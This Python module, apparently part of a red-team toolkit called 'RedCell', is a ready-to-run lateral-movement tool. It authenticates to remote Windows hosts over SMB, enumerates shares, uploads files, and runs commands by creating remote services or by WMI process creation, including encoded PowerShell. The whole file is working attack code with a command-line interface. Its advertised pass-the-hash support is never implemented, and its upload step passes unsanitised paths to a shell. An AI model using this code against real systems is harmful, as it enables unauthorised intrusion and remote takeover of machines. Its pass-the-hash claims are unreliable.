"""
SMB/WMI Lateral Movement Module

Remote code execution via SMB and WMI protocols.
"""

import subprocess
import platform
from typing import Optional, List, Dict, Tuple
import re
import base64


class SMBExecution:
    """
    SMB-based lateral movement and remote code execution.

    Techniques:
    - PSExec-style execution
    - Service creation and execution
    - Remote file operations
    - Share enumeration
    - Pass-the-hash authentication
    """

    def __init__(
        self,
        target: str,
        username: str,
        password: Optional[str] = None,
        domain: str = ".",
        hash: Optional[str] = None
    ):
        """
        Initialize SMB execution.

        Args:
            target: Target hostname or IP
            username: Username for authentication
            password: Password (or None if using hash)
            domain: Domain name (default: local)
            hash: NTLM hash for pass-the-hash
        """
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.hash = hash
        self.os_type = platform.system().lower()

    def test_connection(self) -> bool:
        """
        Test SMB connection to target.

        Returns:
            True if connection successful
        """
        print(f"[*] Testing SMB connection to {self.target}...")

        try:
            if 'windows' in self.os_type:
                # Windows - use net use
                cmd = ['net', 'use', f'\\\\{self.target}\\IPC$']

                if self.password:
                    cmd.extend([f'/user:{self.domain}\\{self.username}', self.password])

                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=10
                )

                if result.returncode == 0:
                    print(f"[+] SMB connection successful")
                    # Cleanup
                    subprocess.run(['net', 'use', f'\\\\{self.target}\\IPC$', '/delete'],
                                 capture_output=True)
                    return True
                else:
                    print(f"[-] SMB connection failed: {result.stderr}")
                    return False

            else:
                # Linux - use smbclient
                cmd = ['smbclient', f'//{self.target}/IPC$', '-U',
                      f'{self.domain}\\{self.username}%{self.password}', '-c', 'exit']

                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=10
                )

                if result.returncode == 0:
                    print(f"[+] SMB connection successful")
                    return True
                else:
                    print(f"[-] SMB connection failed")
                    return False

        except Exception as e:
            print(f"[-] Error testing SMB connection: {e}")
            return False

    def enumerate_shares(self) -> List[str]:
        """
        Enumerate SMB shares on target.

        Returns:
            List of share names
        """
        print(f"[*] Enumerating shares on {self.target}...")

        shares = []

        try:
            if 'windows' in self.os_type:
                # Windows - use net view
                cmd = ['net', 'view', f'\\\\{self.target}']

                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=10
                )

                if result.returncode == 0:
                    # Parse shares
                    for line in result.stdout.split('\n'):
                        if 'Disk' in line or 'disk' in line:
                            parts = line.split()
                            if parts:
                                shares.append(parts[0])

            else:
                # Linux - use smbclient
                cmd = ['smbclient', '-L', f'//{self.target}', '-U',
                      f'{self.domain}\\{self.username}%{self.password}']

                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=10
                )

                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'Disk' in line:
                            parts = line.split()
                            if parts:
                                shares.append(parts[0])

            if shares:
                print(f"[+] Found {len(shares)} shares:")
                for share in shares:
                    print(f"    - {share}")

        except Exception as e:
            print(f"[-] Error enumerating shares: {e}")

        return shares

    def upload_file(self, local_path: str, remote_path: str) -> bool:
        """
        Upload file to remote system via SMB.

        Args:
            local_path: Local file path
            remote_path: Remote file path (e.g., C$\\temp\\file.exe)

        Returns:
            True if successful
        """
        print(f"[*] Uploading {local_path} to \\\\{self.target}\\{remote_path}")

        try:
            if 'windows' in self.os_type:
                # Connect to share
                share = remote_path.split('\\')[0]
                subprocess.run(
                    ['net', 'use', f'\\\\{self.target}\\{share}',
                     self.password, f'/user:{self.domain}\\{self.username}'],
                    capture_output=True,
                    timeout=10
                )

                # Copy file
                dest = f'\\\\{self.target}\\{remote_path}'
                result = subprocess.run(
                    ['copy', local_path, dest],
                    capture_output=True,
                    text=True,
                    timeout=30,
                    shell=True
                )

                if result.returncode == 0:
                    print(f"[+] File uploaded successfully")
                    return True

            else:
                # Linux - use smbclient
                share = remote_path.split('/')[0]
                remote_file = '/'.join(remote_path.split('/')[1:])

                cmd = f'put {local_path} {remote_file}'

                proc = subprocess.Popen(
                    ['smbclient', f'//{self.target}/{share}', '-U',
                     f'{self.domain}\\{self.username}%{self.password}',
                     '-c', cmd],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )

                stdout, stderr = proc.communicate(timeout=30)

                if proc.returncode == 0:
                    print(f"[+] File uploaded successfully")
                    return True

        except Exception as e:
            print(f"[-] Error uploading file: {e}")

        return False

    def psexec_execute(
        self,
        command: str,
        service_name: str = "RedCellSvc"
    ) -> bool:
        """
        Execute command using PSExec-style service execution.

        Args:
            command: Command to execute
            service_name: Service name to create

        Returns:
            True if successful
        """
        print(f"[*] Executing command via PSExec-style: {command}")

        try:
            # Method 1: Use PsExec if available
            try:
                cmd = [
                    'psexec.exe',
                    f'\\\\{self.target}',
                    '-u', f'{self.domain}\\{self.username}',
                    '-p', self.password,
                    '-accepteula',
                    '-s',
                    command
                ]

                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=30
                )

                if result.returncode == 0 or 'started' in result.stdout.lower():
                    print(f"[+] Command executed via PsExec")
                    print(result.stdout)
                    return True

            except FileNotFoundError:
                print("[*] PsExec not found, using manual method...")

            # Method 2: Manual service creation
            print("[*] Creating remote service...")

            # Create service
            sc_create = [
                'sc', f'\\\\{self.target}',
                'create', service_name,
                'binPath=', command,
                'start=', 'demand'
            ]

            result = subprocess.run(
                sc_create,
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode != 0:
                print(f"[-] Failed to create service: {result.stderr}")
                return False

            print(f"[+] Service '{service_name}' created")

            # Start service
            sc_start = ['sc', f'\\\\{self.target}', 'start', service_name]

            result = subprocess.run(
                sc_start,
                capture_output=True,
                text=True,
                timeout=10
            )

            # Service may fail to start if command completes quickly
            # This is actually success for one-shot commands

            print(f"[+] Service started (command executed)")

            # Cleanup - delete service
            subprocess.run(
                ['sc', f'\\\\{self.target}', 'delete', service_name],
                capture_output=True,
                timeout=10
            )

            return True

        except Exception as e:
            print(f"[-] Error in PSExec execution: {e}")
            return False


class WMIExecution:
    """
    WMI-based lateral movement and remote code execution.

    Techniques:
    - WMI command execution
    - Process creation
    - Remote registry access
    - Event log manipulation
    """

    def __init__(
        self,
        target: str,
        username: str,
        password: str,
        domain: str = "."
    ):
        """
        Initialize WMI execution.

        Args:
            target: Target hostname or IP
            username: Username for authentication
            password: Password
            domain: Domain name
        """
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain

    def execute_command(self, command: str) -> Optional[str]:
        """
        Execute command via WMI.

        Args:
            command: Command to execute

        Returns:
            Command output or None
        """
        print(f"[*] Executing command via WMI: {command}")

        try:
            # Use WMIC
            cmd = [
                'wmic',
                '/node:' + self.target,
                '/user:' + f'{self.domain}\\{self.username}',
                '/password:' + self.password,
                'process', 'call', 'create',
                command
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                print(f"[+] Command executed successfully")

                # Extract process ID
                match = re.search(r'ProcessId = (\d+)', result.stdout)
                if match:
                    pid = match.group(1)
                    print(f"[+] Process ID: {pid}")

                return result.stdout
            else:
                print(f"[-] Command failed: {result.stderr}")
                return None

        except Exception as e:
            print(f"[-] Error executing WMI command: {e}")
            return None

    def execute_powershell(self, ps_script: str) -> Optional[str]:
        """
        Execute PowerShell script via WMI.

        Args:
            ps_script: PowerShell script content

        Returns:
            Output or None
        """
        print(f"[*] Executing PowerShell via WMI...")

        # Encode PowerShell script
        encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()

        # Build PowerShell command
        command = f'powershell.exe -EncodedCommand {encoded}'

        return self.execute_command(command)

    def query_remote(self, wmi_query: str) -> Optional[str]:
        """
        Execute WMI query on remote system.

        Args:
            wmi_query: WMI query (e.g., "SELECT * FROM Win32_OperatingSystem")

        Returns:
            Query results or None
        """
        print(f"[*] Executing WMI query: {wmi_query}")

        try:
            cmd = [
                'wmic',
                '/node:' + self.target,
                '/user:' + f'{self.domain}\\{self.username}',
                '/password:' + self.password,
                wmi_query
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                print(f"[+] Query successful")
                return result.stdout
            else:
                print(f"[-] Query failed: {result.stderr}")
                return None

        except Exception as e:
            print(f"[-] Error executing WMI query: {e}")
            return None

    def get_system_info(self) -> Dict:
        """
        Get remote system information via WMI.

        Returns:
            Dictionary of system information
        """
        print(f"[*] Gathering system information from {self.target}...")

        info = {}

        # OS information
        os_result = self.query_remote("os get Caption,Version,OSArchitecture")
        if os_result:
            info['os'] = os_result.strip()

        # Computer information
        comp_result = self.query_remote("computersystem get Name,Domain,Manufacturer,Model")
        if comp_result:
            info['computer'] = comp_result.strip()

        # Process list
        proc_result = self.query_remote("process list brief")
        if proc_result:
            info['processes'] = len(proc_result.split('\n'))

        return info


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell SMB/WMI Lateral Movement')
    parser.add_argument('target', help='Target hostname or IP')
    parser.add_argument('--username', '-u', required=True, help='Username')
    parser.add_argument('--password', '-p', help='Password')
    parser.add_argument('--hash', help='NTLM hash for pass-the-hash')
    parser.add_argument('--domain', '-d', default='.', help='Domain')

    parser.add_argument('--test', action='store_true', help='Test connection')
    parser.add_argument('--shares', action='store_true', help='Enumerate shares')
    parser.add_argument('--upload', nargs=2, metavar=('LOCAL', 'REMOTE'),
                       help='Upload file')
    parser.add_argument('--exec', help='Execute command via SMB')
    parser.add_argument('--wmi', help='Execute command via WMI')
    parser.add_argument('--sysinfo', action='store_true', help='Get system info via WMI')

    args = parser.parse_args()

    # SMB operations
    if args.test or args.shares or args.upload or args.exec:
        smb = SMBExecution(
            args.target,
            args.username,
            args.password,
            args.domain,
            args.hash
        )

        if args.test:
            smb.test_connection()

        if args.shares:
            smb.enumerate_shares()

        if args.upload:
            smb.upload_file(args.upload[0], args.upload[1])

        if args.exec:
            smb.psexec_execute(args.exec)

    # WMI operations
    if args.wmi or args.sysinfo:
        if not args.password:
            print("[-] Password required for WMI operations")
            return

        wmi = WMIExecution(
            args.target,
            args.username,
            args.password,
            args.domain
        )

        if args.wmi:
            wmi.execute_command(args.wmi)

        if args.sysinfo:
            info = wmi.get_system_info()
            print("\n[+] System Information:")
            for key, value in info.items():
                print(f"\n{key.upper()}:")
                print(value)


if __name__ == '__main__':
    main()
